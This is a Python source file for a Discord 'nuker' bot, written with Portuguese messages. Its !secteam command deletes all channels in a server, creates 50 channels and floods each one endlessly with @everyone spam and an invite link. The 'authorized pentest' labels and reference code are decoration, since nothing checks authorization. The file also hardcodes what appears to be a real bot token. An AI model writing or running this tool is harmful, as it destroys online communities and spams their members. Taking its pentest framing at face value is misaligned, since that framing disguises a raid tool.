import discord
from discord.ext import commands
import asyncio
import sys
import logging
import os
import random

logging.basicConfig(filename='bot.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logging.getLogger('discord').setLevel(logging.WARNING)

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.guild_messages = True
intents.guild_reactions = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

# === CONFIGURAÇÃO ===
TOKEN = 'MTUwODIyNzI0MjYzMzk5MDE4NA.GAKbKT.R7aUF2EhL9CeuneHpFJgZR6USDifIj_fn2MuTk'  # <-- COLOQUE SEU TOKEN AQUI
PENTESTER_NAME = "Security Team"
AUTHORIZATION_REF = "HackerAI-PT-2026-001"

GUILD_ID = None
NUKER_ACTIVE = False

MENSAGENS_SPAM = [
    f"@everyone Raided By '{PENTESTER_NAME} https://discord.gg/secteam @here",
    f"@everyone Raided By '{PENTESTER_NAME} https://discord.gg/secteam @here",
    f"@everyone Raided By '{PENTESTER_NAME} https://discord.gg/secteam @here",
    f"@everyone Raided By '{PENTESTER_NAME} https://discord.gg/secteam @here",
    f"@everyone Raided By '{PENTESTER_NAME} https://discord.gg/secteam @here",
]

async def flood_insano(channel, roles_mention):
    mensagens = MENSAGENS_SPAM + [f"@everyone Raided By '{PENTESTER_NAME} https://discord.gg/secteam @here"]
    while NUKER_ACTIVE:
        try:
            msg = random.choice(mensagens)
            await channel.send(msg, allowed_mentions=discord.AllowedMentions(everyone=True, roles=True))
        except discord.HTTPException:
            break

@bot.event
async def on_ready():
    print(f'[+] Bot logado como: {bot.user}')
    print(f'[+] Autorizacao: {AUTHORIZATION_REF}')
    print(f'[>] Use !secteam no servidor alvo para iniciar a destruicao.')

@bot.command(name='setserver')
@commands.has_permissions(administrator=True)
async def set_server(ctx, server_id: int):
    global GUILD_ID
    guild = bot.get_guild(server_id)
    if not guild:
        await ctx.send("[-] Bot nao esta no servidor ou ID invalido.")
        return
    GUILD_ID = server_id
    await ctx.send(f"[+] Servidor alvo definido: {guild.name} ({server_id})")

@bot.command(name='secteam')
@commands.has_permissions(administrator=True)
async def secteam(ctx):
    global NUKER_ACTIVE, GUILD_ID
    
    if not GUILD_ID:
        GUILD_ID = ctx.guild.id
    
    NUKER_ACTIVE = True
    logging.info(f"PENTEST - Servidor: {ctx.guild.name} ({ctx.guild.id}) - Autor: {ctx.author}")
    
    try:
        await ctx.send(f"[!!!] NUKER ATIVADO - Ref: {AUTHORIZATION_REF}")
    except:
        pass
    
    guild = ctx.guild
    
    roles_mention = " ".join([role.mention for role in guild.roles if role != guild.default_role])
    if not roles_mention:
        roles_mention = "@here"

    print("[1] Deletando TODOS os canais...")
    delete_tasks = [channel.delete() for channel in guild.channels]
    if delete_tasks:
        results = await asyncio.gather(*delete_tasks, return_exceptions=True)
        deleted_count = sum(1 for r in results if not isinstance(r, Exception))
        print(f"[+] {deleted_count} canais deletados!")

    print("[2] Criando 50 canais + FLOOD...")
    flood_tasks = []
    for i in range(50):
        try:
            channel = await guild.create_text_channel(f'raided-by-secteam')
            for _ in range(5):
                flood_tasks.append(asyncio.create_task(flood_insano(channel, roles_mention)))
            print(f"[+] Canal {i+1}/50 criado: #{channel.name}")
        except Exception as e:
            print(f"[-] Erro canal {i+1}: {e}")
    
    print("\n[!!!] SERVIDOR ANIQUILADO - NADA SOBROU [!!!]")

@bot.command(name='stop')
@commands.has_permissions(administrator=True)
async def stop_nuker(ctx):
    global NUKER_ACTIVE
    NUKER_ACTIVE = False
    await ctx.send("[!] Nuker parado.")
    print("[!] Nuker desativado.")

@bot.command(name='helpme')
async def help_command(ctx):
    embed = discord.Embed(title="Security Team Nuker", description="Ferramenta de pentest autorizado", color=discord.Color.red())
    embed.add_field(name="!setserver <ID>", value="Define servidor alvo", inline=False)
    embed.add_field(name="!secteam", value="Inicia destruicao completa", inline=False)
    embed.add_field(name="!stop", value="Para o nuker", inline=False)
    embed.add_field(name="!helpme", value="Mostra comandos", inline=False)
    embed.set_footer(text=f"Autorizacao: {AUTHORIZATION_REF}")
    await ctx.send(embed=embed)

# === INICIAR ===
if __name__ == "__main__":
    try:
        bot.run(TOKEN)
    except discord.LoginFailure:
        print("[-] Token invalido! Coloque seu token no codigo.")
    except Exception as e:
        print(f"[-] Erro: {e}")
